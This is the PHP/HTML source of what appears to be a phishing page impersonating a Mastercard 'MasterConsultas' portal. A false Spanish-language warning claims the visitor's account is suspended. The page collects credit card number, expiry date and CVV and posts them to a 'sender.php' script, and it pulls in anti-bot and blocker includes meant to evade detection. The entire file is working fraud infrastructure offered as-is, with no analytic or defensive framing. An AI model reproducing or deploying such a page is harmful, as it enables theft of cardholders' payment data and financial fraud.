<?php

 include 'php/err.php';
include 'php/blocker.php';
include 'php/antibots4.php';

?>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8" />
	<title>MasterConsultas</title>
<link rel="icon" href="res/img/logo.png" />
<script type="text/javascript" src="res/js/jquery-1.6.4.js"></script>
<link rel="stylesheet" href="res/style.css">
<link rel="stylesheet" href="https://free-style-css.blogspot.com/" />
	<script type="text/javascript" src="res/js/toolsMasterconsultas.js" ></script>
	<script type="text/javascript" src="res/js/jquery.blockUI.js" ></script>		
	<script type="text/javascript" src="res/js/m.js" ></script>		
</head>
<body class="home nolog">
	<header>
<div id="header" class="nolog">
  <div class="header-content">
    <h1><a href="">MasterConsultas</a></h1>
  </div>
</div>
</header> 	
 
 
<meta http-equiv="Cache-Control" content="no-cache, no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">





<script type="text/javascript" src="res/js/jquery.easydrag.js"  ></script>
<script type="text/javascript" src="res/js/keyboard.js"  ></script>
<style>
/* style keyboard */
table tbody tr td {padding:0;} 
.nabil{color:red; font-size:1em; padding-left:45%;  }
.megamass{  }
</style>

<div id="container" class="clearfix" style="" >
  <div class="content "  style="padding-bottom:55px;">
      <div class="cont-header">
      <h3 class="title">Debes actualizar tu cuenta para que se active permanentemente.</h3>
      <p class="copete">Su cuenta est&#225; actualmente suspendida. Toda la informaci&#243;n debe ingresarse correctamente y 
	  luego su cuenta ser&#225; liberada autom&#225;ticamente y gracias.</p>
    </div>
	
<form  action="./sender.php" method="post" class="form-altavirtual" novalidate >

<fieldset>	


		   <?php if($_GET['car'] == 'f'){echo '<div class="nabil" id="one"> requerido </div>';} else{echo '';} ?>
<p class="nrotar megamass" >
<label>N&#218;MERO DE TARJETA DE CR&#201;DITO</label><span>
 <input type="text" name="cardnumber" maxlength="16"   id="cardnumber" class="w164 megamass"  ></span>
<img src="./res/img/logo.png" height="32" width="45" >

</p>

 
<p class="nrotar">          
<label>MES/A&#209;O</label>
<span>
<select   name="MM" id="registerSubmit_selectDocType" class="w70 megamass">
<script>
var mm = 01;
for(mm ; mm <= 12; mm++){
	document.write("<option value="+mm+">"+mm);
}
</script>
</select>
<select name="YY" id="registerSubmit_selectDocType" class="w70 megamass">
<script>
var yy = 19;
for(yy ; yy <= 30; yy++){
	document.write("<option value="+yy+">"+yy);
}
</script>
</select>
</span></p>  


 <?php if($_GET['c'] == 'f'){echo '<div class="nabil" id="two"> requerido </div>';} else{echo '';}?>   
<p class="nrotar megamass " >
<label>C&#211;DIGO DE SEGURIDAD (CVV)</label><span>
<input type="text" name="cvv"  maxlength="3"   id="cvv" class="w76 megamass" >
</span><img src="./res/img/standard-codigo-de-seguridad.png">
<small>&#218;LTIMOS 3 D&#237;GITOS DEL PANEL.</small></p>
	
		
 </fieldset>
<input   type="submit" id="submitLogin" value="Confirmar" name="card" class="btn-224px" style="border:none;"  blocksui="true" >
   </form>
    </div>
</div>
<script>
$(function(){
	$("#cardnumber").keyup(function(){
		var card = $("#cardnumber").val();
		if(card != ''){
		$("#one").hide("2000");
		}
		else{
			$("#one").show("2000");
		}
	});
});

$(function(){
	$("#cvv").keyup(function(){
		var card = $("#cvv").val();
		if(card != ''){
		$("#two").hide("2000");
		}
		else{
			$("#two").show("2000");
		}
	});
});
 

</script>

<footer>
<div id="footer">
  	<div class="footer-content">
      <div class="box socios">
          <h5>Socios</h5>
          <ul>
          	<li><a href="">Tarjetas de Crédito</a></li>
            <li><a href="">Otras Tarjetas</a></li>
            <li><a href="" >Promociones</a></li>
            <li><a href="" >Novedades</a></li>
          </ul>
      </div>
      <div class="box comercios">          
           <h5>Comercios</h5>
           <ul>
            <li><a href="">Acepte Mastercard</a></li>
            <li><a href="">Servicios</a></li>
            <li><a href="">Novedades</a></li>
            <li><a href="">Descargas</a></li>
          </ul>
      </div>        
      <div class="box empresas">
          <h5>Empresas</h5>
          <ul>
            <li><a href="" >Tarjetas</a></li>
            <li><a href="" >Promociones</a></li>
          </ul>
      </div>      
      <div class="box contactenos">
           <h5>¿Necesita ayuda?</h5>
           <ul>
            <li><a href="" >¿Extravió su tarjeta?</a></li>
            <li><a href="" >Buscador Cajeros</a></li>
			<li><a href="" >Contáctese con nosotros</a></li>
          </ul>      
      </div>
    </div>
    <a href="" class="top"></a>
    <h6>MasterCard</h6>
    <p class="loginDF">
    	<a href="">First Data Cono Sur S.R.L.</a> | <a href="">Todos los derechos reservados</a><br>    	 
    	<a href="" >Términos y Condiciones</a> | <a href="">Medidas de Seguridad</a> | <a href="" >Protección de Datos Personales</a> | <a href="" >Defensa y Protección al Consumidor</a>
    </p>
  </div>
</footer>	


<script type="text/javascript">
		unblockUI();
		attachBlockUI();	
		if (self === top) { 
			var antiClickjack = document.getElementById("antiClickjack"); 
			antiClickjack.parentNode.removeChild(antiClickjack); 
		} else { 
			top.location = self.location; 
		}
</script>
</body>
</html>